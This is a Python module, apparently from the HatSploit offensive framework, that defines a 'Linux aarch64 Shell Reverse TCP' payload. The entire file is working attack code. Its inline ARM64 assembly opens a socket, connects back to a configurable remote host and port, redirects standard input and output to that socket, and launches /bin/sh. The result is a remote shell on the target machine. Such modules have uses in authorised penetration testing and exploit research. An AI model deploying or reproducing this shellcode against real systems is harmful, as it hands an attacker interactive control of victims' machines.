"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *
from pex.assembler import Assembler
from pex.socket import Socket


class HatSploitPayload(Payload, Handler, Assembler, Socket):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux aarch64 Shell Reverse TCP",
            'Payload': "linux/aarch64/shell_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Shell reverse TCP payload for Linux aarch64.",
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Type': ReverseTCP,
        })

    def implant(self):
        return self.assemble(
            self.details['Arch'],
            """
            bl start

            path:
                .asciz "/bin/sh"

            start:
                mov x1, 0x3
                mov x2, 0
                mov x8, 0x18

            dup:
                mov x0, x12
                sub x1, x1, 1
                svc 0
                cmp x1, 0
                bne dup

            shell:
                adr x0, path
                mov x1, xzr
                mov x2, xzr
                mov x8, 0xdd
                svc 0
            """
        )

    def run(self):
        return self.assemble(
            self.details['Arch'],
            f"""
            bl start

            addr:
                .short 0x2
                .short 0x{self.rport.little.hex()}
                .word 0x{self.rhost.little.hex()}

            start:
                mov x0, 0x2
                mov x1, 0x1
                mov x2, 0
                mov x8, 0xc6
                svc 0
                mov x12, x0

                adr x1, addr
                mov x2, 0x10
                mov x8, 0xcb
                svc 0
            """
        ) + self.implant()
